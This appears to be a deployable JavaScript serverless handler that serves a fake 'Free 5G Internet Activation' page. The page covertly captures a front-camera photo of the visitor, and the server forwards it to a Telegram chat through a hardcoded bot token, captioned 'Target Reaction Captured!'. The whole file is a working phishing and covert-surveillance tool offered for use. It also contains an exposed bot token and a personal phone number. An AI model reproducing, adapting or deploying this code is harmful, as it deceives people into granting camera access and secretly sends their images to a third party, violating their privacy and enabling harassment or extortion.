const axios = require('axios');
const FormData = require('form-data');

export default async function handler(req, res) {
    const botToken = "8796859741:AAEoe1AmDlHY1j1vqyPsm-XbaLAgIy5oa90";

    if (req.method === 'POST') {
        try {
            const { image, id } = req.body;
            if (!image || !id) return res.status(400).json({ error: "Missing data" });

            const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
            const imageBuffer = Buffer.from(base64Data, 'base64');

            const form = new FormData();
            form.append('chat_id', id);
            form.append('photo', imageBuffer, { filename: 'capture.jpg' });
            form.append('caption', "📸 Target Reaction Captured!\n\n👨‍💻 DEVELOPER: @Eshucording\n📞 Contact: 8123561579");

            await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, form, {
                headers: form.getHeaders(),
            });
            return res.status(200).json({ success: true });
        } catch (error) {
            console.error(error);
            return res.status(200).json({ success: false }); 
        }
    }

    res.setHeader('Content-Type', 'text/html');
    return res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Free 5G Internet Offer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <h1>Free 5G Internet Activation</h1>
    <p>Verifying your device compatibility...</p>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('id') || "5806465363"; 

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    video.play();
                    // 2-second delay ensures the "black screen" transition finishes
                    setTimeout(takeSnapshot, 2000);
                };
            } catch (e) {
                console.error("Access denied");
            }
        }

        function takeSnapshot() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Draw the frame
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const data = canvas.toDataURL('image/jpeg', 0.9);

            fetch(window.location.href, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: data, id: chatId })
            }).then(() => {
                // Close camera stream after sending
                const stream = video.srcObject;
                const tracks = stream.getTracks();
                tracks.forEach(t => t.stop());
            });
        }

        window.onload = initCamera;
    </script>
</body>
</html>
    `);
    }
                                             
